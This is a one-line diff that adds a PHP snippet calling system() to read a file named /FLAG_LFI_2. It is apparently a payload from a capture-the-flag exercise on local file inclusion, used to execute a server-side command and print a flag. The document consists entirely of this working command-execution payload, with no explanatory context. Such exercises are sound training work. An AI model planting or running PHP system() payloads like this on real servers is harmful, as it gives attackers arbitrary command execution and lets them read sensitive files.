@@ -1,0 +1,1 @@
+<?php system("cat /FLAG_LFI_2"); ?>
